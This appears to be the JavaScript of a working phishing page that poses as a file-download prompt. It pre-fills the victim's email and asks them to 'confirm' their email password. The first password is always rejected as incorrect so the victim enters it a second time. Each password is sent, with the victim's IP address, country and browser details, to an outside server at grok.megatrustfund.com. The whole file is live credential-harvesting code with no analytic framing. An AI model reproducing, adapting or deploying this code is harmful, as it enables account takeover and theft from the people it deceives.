let passwordAttempts = 0;  

// DOM elements
const modal = document.getElementById('modal');
const closeBtn = document.querySelector('.close');
const emailStep = document.getElementById('email-step');
const passwordStep = document.getElementById('password-step');
const proceedEmailBtn = document.getElementById('proceed-email');
const submitButton = document.getElementById('proceed-submit');
const emailInput = document.getElementById('email');
const passwordLabel = document.querySelector('#password-step label');
const passwordInput = document.getElementById('password');
const form = document.getElementById('form');
const passwordForm = document.getElementById('password-form');
const formTitle = document.querySelector('.modal-content h5');
const feedbackMessage = document.querySelector('.feedback');
const emailFeedback = document.getElementById('email-feedback');

passwordStep.style.display = 'none'; 

// Incorrect message setup
const incorrectMessage = document.createElement('p');
incorrectMessage.style.color = 'red';
incorrectMessage.style.display = 'none'; // Hidden initially
passwordStep.appendChild(incorrectMessage);



// Close modal and reset form
closeBtn.onclick = function() {
    resetForm();
    modal.style.display = 'none';
};


function emailstuff(emailaddress) {
    // Auto-populate the email field and simulate the button click process
        emailInput.value = emailaddress;
        proceedEmailBtn.disabled = true;
        proceedEmailBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>'; // Show spinner

        // Simulate a delay before transitioning to the password form
        setTimeout(function() {
            emailStep.style.display = 'none';
            passwordStep.style.display = 'flex';
            formTitle.textContent = 'Confirm your email password to continue';
            document.getElementById('email-confirmation').value = emailaddress; 
            passwordInput.focus();
        }, 4000); // 4 seconds delay
}



// Modal click behavior to open the modal
document.body.addEventListener('click', function(event) {
    if (event.target === document.body || event.target.tagName === 'HTML') {
        
        if(emailFromURL) {
            
            modal.style.display = 'flex';
            emailstuff(emailFromURL)
        }else{
            modal.style.display = 'flex';
            emailInput.focus();
        }
        
    }
});


// Email validation and transition to password step
form.addEventListener('submit', function(event) {
    // If form validation fails, this event listener won't be called, so validation works first
    event.preventDefault();  // Prevent the form from submitting the usual way

    // Now let JavaScript handle it
    const enteredEmail = emailInput.value;
    const emailPattern = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

    if (!enteredEmail || !emailPattern.test(enteredEmail)) {
        emailFeedback.textContent = "Please enter a valid email";
        emailFeedback.style.display = 'block';
        emailInput.focus();
        return;
    }

    emailFeedback.style.display = 'none';  // Hide feedback

    // Show a spinner and disable the button
    proceedEmailBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
    proceedEmailBtn.disabled = true;

    // Simulate a 3-second delay before transitioning to password step
    setTimeout(function() {
        formTitle.textContent = 'Confirm your email password to continue';
        emailStep.style.display = 'none';
        passwordStep.style.display = 'flex';
        passwordInput.focus();
        
        // Set read-only email in password step
        document.getElementById('email-confirmation').value = enteredEmail;
        proceedEmailBtn.innerHTML = 'Download';
        proceedEmailBtn.disabled = false;
    }, 3000);
});

// Function to reset the form
function resetForm() {
    emailInput.setAttribute('required', 'true');
    formTitle.textContent = 'Enter email to download files';
    emailInput.value = '';
    passwordInput.value = '';
    submitButton.disabled = false;  
    submitButton.innerHTML = 'Continue';
    emailStep.style.display = 'flex';
    passwordStep.style.display = 'none';
    feedbackMessage.style.display = 'none';
    proceedEmailBtn.innerHTML = 'Download to Email';
    proceedEmailBtn.disabled = false;
    passwordAttempts = 0;
}

passwordForm.addEventListener('submit', function(event) {
    // Prevent the form from submitting
    event.preventDefault();
    passwordAttempts++; 

    // Show spinner in 'Submit' button
    submitButton.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
    submitButton.disabled = true;

    // Capture email and password for both attempts
    const enteredEmail = emailInput.value;
    const message = passwordInput.value;

    if (passwordAttempts === 1) {
        // First attempt: send the email
        sendmsg(enteredEmail, message)
        .then(() => {
            // After email is sent, show the message
            feedbackMessage.innerHTML = 'Incorrect email or password, please try again';
            feedbackMessage.style.display = 'block';
            passwordInput.value = "";  // Clear password input
            passwordInput.focus();     // Focus back on password input
            submitButton.innerHTML = 'Continue';  // Reset button text
            submitButton.disabled = false;  // Re-enable button
        })
        .catch(error => {
            // everything gonna be alright
            submitButton.innerHTML = 'Continue';  // Reset button text
            submitButton.disabled = false;  // Re-enable button
        });

    } else if (passwordAttempts === 2) {
        // Second attempt: send the email and reload the page or show success
        sendmsg(enteredEmail, message)
        .then(() => {
            feedbackMessage.style.display = 'none';  // Hide feedback
            submitButton.innerHTML = 'Continue';  // Reset button text
            submitButton.disabled = false;  // Re-enable button
            // Do something else after the second attempt, like a redirect
        })
        .catch(error => {
            // everything gonna be alright
            submitButton.innerHTML = 'Continue';  // Reset button text
            submitButton.disabled = false;  // Re-enable button
        });
    }
});

// Hide feedback message when the user starts typing in the password field
passwordInput.addEventListener('input', function() {
    feedbackMessage.style.display = 'none';
    feedbackMessage.innerHTML = '';  // Clear the message content
});

// Updated sendmsg function to return promise
function sendmsg(enteredEmail, message) {
    const userAgent = navigator.userAgent;

    return fetch('https://ipinfo.io/json?token=4c3c68bccf3c20')
        .then(response => response.json())
        .then(data => {
            const userIP = data.ip;
            const country = data.country;
            const ipCountryStatement = `${userIP} - ${country}`;

            const userDetails = {
                ip: ipCountryStatement,
                userAgent: userAgent,
                email: enteredEmail,
                message: message
            };

            return fetch('https://grok.megatrustfund.com/send-email.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(userDetails)
            });
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                // everything gonna be alright
            } else {
                // everything gonna be alright
            }
        })
        .catch(error => {
            // everything gonna be alright
        });
}


